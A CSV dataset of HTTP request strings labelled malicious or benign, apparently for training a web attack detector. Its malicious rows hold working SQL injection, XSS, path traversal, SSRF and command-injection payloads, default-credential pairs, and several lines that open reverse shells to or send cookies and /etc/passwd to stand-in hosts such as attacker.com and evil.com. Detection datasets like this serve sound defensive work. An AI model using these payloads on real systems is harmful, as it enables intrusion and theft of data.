"text","label"
"url=dict://127.0.0.1:11211/","1"
"POST /api/users body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /api/files?name=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"POST /api/login username=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- password=test","1"
"username=administrator&password=qwerty","1"
"POST /settings body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"username=root&password=monkey","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"Authorization: Bearer validtoken811","0"
"POST /api/feedback body=<a href='javascript:alert(1)'>click</a>","1"
"POST /api/data body=command| wget http://attacker.com/shell.sh","1"
"order_id=' OR ''='","1"
"message=<div onmouseover=alert(1)>hover</div>","1"
"url=http://192.168.1.1","1"
"url=file:///etc/passwd","1"
"page=36&limit=20","0"
"POST /api/login body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"Authorization: Bearer validtoken302","0"
"DELETE /api/data?date=2024-01-15&type=order","0"
"POST /dashboard body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /health HTTP/1.1","0"
"search=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"User-Agent: Nmap Scripting Engine","1"
"GET /api/swagger.json HTTP/1.1","1"
"GET /api/files?name=file:///etc/passwd","1"
"user_id=472&action=view","0"
"GET /wp-admin HTTP/1.1","1"
"username=') OR ('1'='1","1"
"POST /api/search User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"page=13&limit=10","0"
"PUT /profile?category=electronics&page=1","0"
"1' oR '1'='1","1"
"POST /api/users body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"description=';alert(String.fromCharCode(88,83,83))//","1"
"multiple failed login attempts detected for admin","1"
"GET /api/swagger.json HTTP/1.1","1"
"POST /api/login username=1 AND 1=CONVERT(int,@@version)-- password=test","1"
"order_id=ORD-1596 status=confirmed","0"
"comment=<scr ipt>alert(1)</scr ipt>","1"
"Authorization: Bearer validtoken441","0"
"GET /console HTTP/1.1","1"
"multiple failed login attempts detected for admin","1"
"DELETE /api/users User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"message=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"GET /api/swagger.json HTTP/1.1","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"url=http://localhost:8080","1"
"GET /api/data/5040","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /api/data/3948","0"
"user=1' OR '1'='1' /*","1"
"name=<svg/onload=alert(1)>","1"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"page=31&limit=10","0"
"password spray attack detected multiple users","1"
"page=14&limit=10","0"
"user=' OR ''='","1"
"description=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"file=../../../../etc/shadow","1"
"user_id=29&action=view","0"
"name=Ahmed email=90@mail.com","0"
"category=phones page=1","0"
"comment=<video src=1 onerror=alert(1)>","1"
"order_id=ORD-3027 status=confirmed","0"
"url=file:///etc/passwd","1"
"GET /api/files?name=../../../../var/log/apache2/access.log","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"username=root&password=monkey","1"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"page=10&limit=20","0"
"GET /api/search?q=<script >alert(1)</script >","1"
"url=gopher://127.0.0.1:25/","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /api/users body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"name=Nour email=530@mail.com","0"
"limit=20&offset=0","0"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /api/products/7093","0"
"GET /api/files?name=../../../var/www/html/config.php","1"
"Authorization: Bearer validtoken924","0"
"username=1' AND 1=1 UNION SELECT 1-- -","1"
"category=electronics&page=1","0"
"id=' OR 1=1 INTO OUTFILE '/tmp/x'--","1"
"search=laptop&sort=price","0"
"GET /robots.txt scan probe reconnaissance","1"
"fetch=http://internal-service:8080/secret","1"
"DELETE /api/search User-Agent: axios/1.6.0","0"
"GET /api/orders/3004","0"
"DELETE /api/users User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"cmd=`id`","1"
"user_id=50&action=view","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"order_id=ORD-6901 status=confirmed","0"
"filename=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"username=admin'#","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"GET /web.config HTTP/1.1","1"
"GET /wp-admin HTTP/1.1","1"
"ping=& whoami","1"
"name=Ahmed email=806@mail.com","0"
"GET ..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"name=Nour email=935@mail.com","0"
"page=48&limit=10","0"
"title=<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>","1"
"DELETE /api/orders User-Agent: PostmanRuntime/7.36.0","0"
"path=../../../.env","1"
"include=../../.git/config","1"
"username=administrator&password=letmein","1"
"GET /api/search?q=javascript:alert(document.cookie)","1"
"order_id=ORD-1553 status=confirmed","0"
"page=8&limit=50","0"
"brute force attempt on login endpoint from single ip","1"
"status=pending&priority=high","0"
"host=& whoami","1"
"id=' OR 1=1--","1"
"POST /api/login username=1 UNION SELECT user(),database()-- password=test","1"
"GET /api/files?name=....//....//etc/passwd","1"
"order_id=ORD-2515 status=confirmed","0"
"name=Sara email=127@mail.com","0"
"multiple failed login attempts detected for admin","1"
"id=123&format=json","0"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"username=user&password=password","1"
"search=laptop","0"
"url=gopher://127.0.0.1:25/","1"
"POST /api/login body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"password spray attack detected multiple users","1"
"user_id=580&action=view","0"
"url=http://127.0.0.1/admin","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=tablet","0"
"Authorization: Bearer validtoken935","0"
"Authorization: Bearer validtoken219","0"
"Authorization: Bearer validtoken349","0"
"name=Ahmed email=109@mail.com","0"
"cmd=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"POST /api/data body=command; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"DELETE /api/products User-Agent: python-requests/2.31.0","0"
"POST /api/orders?date=2024-01-15&type=order","0"
"search=laptop","0"
"order_id=ORD-7726 status=confirmed","0"
"POST /profile body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"date=2024-01-15&type=order","0"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"POST /api/login username=1'||'1'='1 password=test","1"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"page=31&limit=20","0"
"admin'#","1"
"GET /health HTTP/1.1","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /api/products body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /api/login User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"path=../../../../etc/shadow","1"
"url=http://metadata.google.internal","1"
"GET /api/files?name=php://filter/convert.base64-encode/resource=config.php","1"
"user_id=556&action=view","0"
"POST /api/products body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"username=user&password=admin123","1"
"username=root&password=admin123","1"
"search=laptop","0"
"POST /api/login?search=laptop&sort=price","0"
"<body onload=alert(1)>","1"
"date=2024-01-15&type=order","0"
"page=8&limit=10","0"
"path=/etc/passwd%00","1"
"user_id=303&action=view","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /health HTTP/1.1","0"
"repeated authentication failure admin account locked","1"
"GET /api/orders/8378","0"
"GET /api/search?limit=20&offset=0","0"
"GET /admin HTTP/1.1","1"
"GET /wp-admin HTTP/1.1","1"
"user_id=529&action=view","0"
"POST /profile User-Agent: python-requests/2.31.0","0"
"name=Lina email=333@mail.com","0"
"title=javascript:alert(1)","1"
"path=/etc/passwd%00","1"
"category=laptops page=2","0"
"GET file:///etc/passwd","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"search=headphones","0"
"order_id=ORD-6075 status=confirmed","0"
"url=http://127.0.0.1/admin","1"
"GET /backup.sql HTTP/1.1","1"
"GET ../../../.env","1"
"user_id=694&action=view","0"
"GET /health HTTP/1.1","0"
"POST /api/data body=command`curl -s http://attacker.com/shell.sh | bash`","1"
"user=ahmed&filter=active","0"
"page=28&limit=10","0"
"ping=`curl -s http://attacker.com/shell.sh | bash`","1"
"url=http://192.168.1.1","1"
"GET /.git/config HTTP/1.1","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"host=& whoami","1"
"GET /api/search/94","0"
"order_id=' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--","1"
"repeated authentication failure admin account locked","1"
"search=<ScRiPt>alert(1)</ScRiPt>","1"
"file=....//....//etc/passwd","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"../../../etc/shadow","1"
"url=gopher://127.0.0.1:25/","1"
"brute force attempt on login endpoint from single ip","1"
"cmd=| uname -a","1"
"Authorization: Bearer validtoken360","0"
"Authorization: Bearer validtoken799","0"
"Authorization: Bearer validtoken239","0"
"date=2024-01-15&type=order","0"
"page=18&limit=20","0"
"GET /health HTTP/1.1","0"
"user=1'/**/OR/**/1=1--","1"
"user=1' AND SLEEP(5)--","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"user=admin'--","1"
"exec=| wget http://attacker.com/shell.sh","1"
"GET /profile/3018","0"
"POST /api/data body=command| wget http://attacker.com/shell.sh","1"
"Authorization: Bearer validtoken428","0"
"' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--","1"
"name=Omar email=15@mail.com","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"name=<script>document.location='https://evil.com/steal?c='+document.cookie</script>","1"
"order_id=ORD-6058 status=confirmed","0"
"brute force attempt on login endpoint from single ip","1"
"name=Lina email=33@mail.com","0"
"message=<textarea onfocus=alert(1) autofocus>","1"
"GET /api/products User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"page=18&limit=50","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"file=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"POST /api/login username=1' OR '1'='1' /* password=test","1"
"POST /api/login username=' OR ''=' password=test","1"
"order_id=ORD-7553 status=confirmed","0"
"page=31&limit=20","0"
"POST /api/login username=' OR '1'='1 password=test","1"
"../../.git/config","1"
"Authorization: Bearer validtoken402","0"
"search=laptop&sort=price","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"password spray attack detected multiple users","1"
"DELETE /api/users User-Agent: axios/1.6.0","0"
"GET /health HTTP/1.1","0"
"DELETE /api/data?user=ahmed&filter=active","0"
"<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"description=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"url=gopher://127.0.0.1:25/","1"
"username=admin&password=1234567890","1"
"user=ahmed&filter=active","0"
"repeated authentication failure admin account locked","1"
"path=../../../../etc/passwd","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"search=headphones","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"name=Sara email=917@mail.com","0"
"url=http://10.0.0.1","1"
"GET /dashboard/8905","0"
"GET /settings/227","0"
"GET /dashboard/6033","0"
"..%2F..%2F..%2Fetc%2Fpasswd","1"
"category=audio page=6","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"fetch=http://internal-service:8080/secret","1"
"GET /health HTTP/1.1","0"
"order_id=ORD-6436 status=confirmed","0"
"password spray attack detected multiple users","1"
"category=laptops page=4","0"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"order_id=ORD-1931 status=confirmed","0"
"host=; python -c 'import socket,subprocess'","1"
"host=`id`","1"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /.env HTTP/1.1","1"
"GET /api/users?id=' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--","1"
"GET /dashboard?limit=20&offset=0","0"
"search=tablet","0"
"GET /api/users?id=' OR 1=1--","1"
"GET /api/files?name=file:///etc/passwd","1"
"limit=20&offset=0","0"
"GET /web.config HTTP/1.1","1"
"<script>alert('XSS')</script>","1"
"page=20&limit=20","0"
"file=../../../.env","1"
"GET ../../.git/config","1"
"ping=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"search=laptop&sort=price","0"
"DELETE /settings User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"url=http://metadata.google.internal","1"
"comment=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"password spray attack detected multiple users","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"' OR 'x'='x","1"
"password spray attack detected multiple users","1"
"host=| uname -a","1"
"order_id=ORD-2065 status=confirmed","0"
"description=<img src=x onerror=alert(1)>","1"
"User-Agent: Nikto/2.5.0","1"
"username=' UNION SELECT NULL--","1"
"order_id=ORD-3699 status=confirmed","0"
"limit=20&offset=0","0"
"Authorization: Bearer validtoken965","0"
"page=18&limit=50","0"
"DELETE /api/products?limit=20&offset=0","0"
"url=http://metadata.google.internal","1"
"id=123&format=json","0"
"PUT /api/users User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"' OR '1'='1'--","1"
"search=phone","0"
"DELETE /dashboard User-Agent: python-requests/2.31.0","0"
"url=http://10.0.0.1","1"
"search=tablet","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"; ls -la","1"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"order_id=1 UNION SELECT 1,2,3--","1"
"GET /api/search?q=<img src=x onerror=alert(1)>","1"
"$(curl -s http://attacker.com/shell.sh)","1"
"url=http://localhost:8080","1"
"name=Omar email=49@mail.com","0"
"search=phone","0"
"GET /api/users?id=1; IF (1=1) WAITFOR DELAY '0:0:5'--","1"
"POST /api/feedback body=<body onload=alert(1)>","1"
"page=24&limit=50","0"
"host=| cat /etc/passwd","1"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"POST /api/data body=command& ipconfig","1"
"repeated authentication failure admin account locked","1"
"message=<textarea onfocus=alert(1) autofocus>","1"
"GET /etc/passwd%00","1"
"GET /health HTTP/1.1","0"
"GET /.env HTTP/1.1","1"
"ping=; cat /etc/shadow","1"
"user='; DELETE FROM orders WHERE 1=1--","1"
"url=http://192.168.1.1","1"
"name=Ahmed email=963@mail.com","0"
"password spray attack detected multiple users","1"
"exec=; ping -c 4 attacker.com","1"
"page=49&limit=50","0"
"username=admin'#","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Authorization: Bearer validtoken126","0"
"GET /web.config HTTP/1.1","1"
"Authorization: Bearer validtoken837","0"
"comment=<body onload=alert(1)>","1"
"../../.git/config","1"
"GET /server-status HTTP/1.1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"page=11&limit=10","0"
"category=tablets page=10","0"
"order_id=ORD-9729 status=confirmed","0"
"file=....//....//etc/passwd","1"
"GET file:///etc/passwd","1"
"message=<script >alert(1)</script >","1"
"name=Ahmed email=934@mail.com","0"
"url=dict://127.0.0.1:11211/","1"
"search=laptop","0"
"page=35&limit=20","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"password spray attack detected multiple users","1"
"category=electronics&page=1","0"
"host=; cat /etc/shadow","1"
"cmd=`curl -s http://attacker.com/shell.sh | bash`","1"
"GET /api/login/8689","0"
"search=headphones","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"path=php://filter/convert.base64-encode/resource=config.php","1"
"file=/etc/passwd%00","1"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"Authorization: Bearer validtoken745","0"
"page=30&limit=20","0"
"DELETE /api/login?q=smartphone&brand=samsung","0"
"username=administrator&password=1234567890","1"
"GET /dashboard?category=electronics&page=1","0"
"repeated authentication failure admin account locked","1"
"user_id=661&action=view","0"
"name=Nour email=848@mail.com","0"
"category=tablets page=9","0"
"search=phone","0"
"url=http://127.0.0.1/admin","1"
"GET /wp-admin HTTP/1.1","1"
"search=laptop&sort=price","0"
"user_id=239&action=view","0"
"search=laptop&sort=price","0"
"category=laptops page=7","0"
"DELETE /api/search User-Agent: PostmanRuntime/7.36.0","0"
"exec=| wget http://attacker.com/shell.sh","1"
"| cat /etc/passwd","1"
"date=2024-01-15&type=order","0"
"category=laptops page=1","0"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"GET /health HTTP/1.1","0"
"exec=& whoami","1"
"username=1 UNION SELECT 1,2,3--","1"
"GET /dashboard/6819","0"
"POST /api/data body=command| wget http://attacker.com/shell.sh","1"
"GET /health HTTP/1.1","0"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"GET /api/login/5437","0"
"url=http://192.168.1.1","1"
"username=1 UNION SELECT 1,2,3--","1"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"category=audio page=3","0"
"DELETE /profile?user=ahmed&filter=active","0"
"page=7&limit=10","0"
"order_id=ORD-1849 status=confirmed","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"search=' UNION ALL SELECT NULL,NULL,NULL--","1"
"POST /api/products?user=ahmed&filter=active","0"
"Authorization: Bearer validtoken329","0"
"file=/etc/passwd%00","1"
"order_id=ORD-8067 status=confirmed","0"
"order_id=ORD-8769 status=confirmed","0"
"password spray attack detected multiple users","1"
"page=3&limit=10","0"
"login attempt failed username admin invalid credentials","1"
"User-Agent: Nmap Scripting Engine","1"
"POST /api/orders User-Agent: PostmanRuntime/7.36.0","0"
"GET /profile/7437","0"
"search=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"POST /api/login username=1' /*!OR*/ 1=1-- password=test","1"
"name=Nour email=420@mail.com","0"
"name=Omar email=595@mail.com","0"
"cmd=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"GET ....//....//etc/passwd","1"
"POST /api/orders body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"POST /api/users body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"username=root&password=password","1"
"GET /backup.sql HTTP/1.1","1"
"order_id=1 OR 1=1","1"
"GET /.env HTTP/1.1","1"
"GET /profile/3423","0"
"name=Sara email=822@mail.com","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"`id`","1"
"GET /profile/7538","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"order_id=ORD-6501 status=confirmed","0"
"user_id=203&action=view","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"url=gopher://127.0.0.1:25/","1"
"url=http://metadata.google.internal","1"
"page=24&limit=20","0"
"POST /api/data?status=pending&priority=high","0"
"title=<img src=`javascript:alert(1)`>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"username=user&password=monkey","1"
"User-Agent: Nmap Scripting Engine","1"
"cmd=$(whoami)","1"
"include=..%2F..%2F..%2Fetc%2Fpasswd","1"
"page=26&limit=20","0"
"POST /api/users body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"user=ahmed&filter=active","0"
"order_id=1'; EXEC xp_cmdshell('whoami')--","1"
"user_id=932&action=view","0"
"GET php://filter/convert.base64-encode/resource=config.php","1"
"category=audio page=10","0"
"password spray attack detected multiple users","1"
"POST /api/orders?search=laptop&sort=price","0"
"| cat /etc/passwd","1"
"cmd=| uname -a","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"name=Ahmed email=643@mail.com","0"
"POST /dashboard?id=123&format=json","0"
"POST /settings body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"password spray attack detected multiple users","1"
"GET /api/search?q=<textarea onfocus=alert(1) autofocus>","1"
"id=123&format=json","0"
"url=http://192.168.1.1","1"
"name=Lina email=463@mail.com","0"
"exec=`id`","1"
"username=administrator&password=password","1"
"PUT /settings?id=123&format=json","0"
"url=file:///etc/passwd","1"
"category=electronics&page=1","0"
"Authorization: Bearer validtoken715","0"
"filename=$(curl -s http://attacker.com/shell.sh)","1"
"url=http://metadata.google.internal","1"
"GET /api/users/731","0"
"GET /dashboard User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"page=13&limit=50","0"
"url=file:///etc/passwd","1"
"PUT /api/data?user=ahmed&filter=active","0"
"multiple failed login attempts detected for admin","1"
"GET /api/products User-Agent: axios/1.6.0","0"
"include=../../.git/config","1"
"1; IF (1=1) WAITFOR DELAY '0:0:5'--","1"
"PUT /api/data?date=2024-01-15&type=order","0"
"name=Sara email=674@mail.com","0"
"User-Agent: Nikto/2.5.0","1"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"id=123&format=json","0"
"category=tablets page=1","0"
"username=administrator&password=password123","1"
"name=Lina email=442@mail.com","0"
"username=admin&password=123456","1"
"message=<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"id=' UNION SELECT 1,table_name FROM information_schema.tables--","1"
"username=root&password=123456","1"
"POST /api/users?id=123&format=json","0"
"GET /health HTTP/1.1","0"
"search=laptop","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"id=123&format=json","0"
"GET /wp-admin HTTP/1.1","1"
"date=2024-01-15&type=order","0"
"page=49&limit=10","0"
"search=' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--","1"
"GET /dashboard?date=2024-01-15&type=order","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"order_id=ORD-4691 status=confirmed","0"
"User-Agent: masscan/1.3","1"
"category=audio page=10","0"
"path=....//....//etc/passwd","1"
"username=user&password=password123","1"
"../../../.env","1"
"GET /api/products User-Agent: python-requests/2.31.0","0"
"' OR 1=1 LIMIT 1--","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"POST /settings User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"username=root&password=batman","1"
"POST /api/login username=1' OR '1'='1' /* password=test","1"
"GET /api/search?q=<details open ontoggle=alert(1)>","1"
"file=../../../var/www/html/config.php","1"
"url=http://metadata.google.internal","1"
"GET /settings/2747","0"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"user=1' OR '1'='1' /*","1"
"../../../../etc/passwd","1"
"POST /api/orders?date=2024-01-15&type=order","0"
"POST /profile body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"login attempt failed username admin invalid credentials","1"
"brute force attempt on login endpoint from single ip","1"
"ping=| uname -a","1"
"url=http://metadata.google.internal","1"
"GET /api/users?id=1' oR '1'='1","1"
"url=http://metadata.google.internal","1"
"POST /api/login username=1 UNION SELECT user(),database()-- password=test","1"
"url=http://10.0.0.1","1"
"url=http://10.0.0.1","1"
"user=ahmed&filter=active","0"
"search=1' /*!OR*/ 1=1--","1"
"host=| cat /etc/passwd","1"
"filename=; ls -la","1"
"GET /api/files?name=../../../etc/shadow","1"
"category=tablets page=4","0"
"GET /api/orders/1805","0"
"POST /api/feedback body=<img src=`javascript:alert(1)`>","1"
"name=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /robots.txt scan probe reconnaissance","1"
"page=50&limit=50","0"
"name=<img src=`javascript:alert(1)`>","1"
"name=Lina email=889@mail.com","0"
"page=34&limit=50","0"
"password spray attack detected multiple users","1"
"GET /api/files?name=../../../var/www/html/config.php","1"
"search=' UNION SELECT NULL--","1"
"category=phones page=1","0"
"include=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"id=1'%09OR%091=1--","1"
"GET /api/data/7398","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /robots.txt scan probe reconnaissance","1"
"GET /api/search/202","0"
"../../../../etc/shadow","1"
"GET /admin HTTP/1.1","1"
"page=9&limit=20","0"
"GET /robots.txt scan probe reconnaissance","1"
"GET /robots.txt scan probe reconnaissance","1"
"cmd=| uname -a","1"
"url=http://127.0.0.1/admin","1"
"GET /health HTTP/1.1","0"
"user='; EXEC master..xp_dirtree '\\\\attacker.com\\share'--","1"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"user=' OR 'x'='x","1"
"path=../../../../var/log/apache2/access.log","1"
"page=39&limit=50","0"
"`curl -s http://attacker.com/shell.sh | bash`","1"
"search=<scr ipt>alert(1)</scr ipt>","1"
"exec=& ipconfig","1"
"name=Ahmed email=976@mail.com","0"
"description=<div onmouseover=alert(1)>hover</div>","1"
"search=tablet","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=http://metadata.google.internal","1"
"GET /phpmyadmin HTTP/1.1","1"
"POST /api/orders body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /api/swagger.json HTTP/1.1","1"
"user=1 AND SLEEP(5)--","1"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"user_id=427&action=view","0"
"exec=& ipconfig","1"
"Authorization: Bearer validtoken630","0"
"brute force attempt on login endpoint from single ip","1"
"POST /api/login username=1'/**/OR/**/1=1-- password=test","1"
"../../../.env","1"
"User-Agent: masscan/1.3","1"
"order_id=ORD-9147 status=confirmed","0"
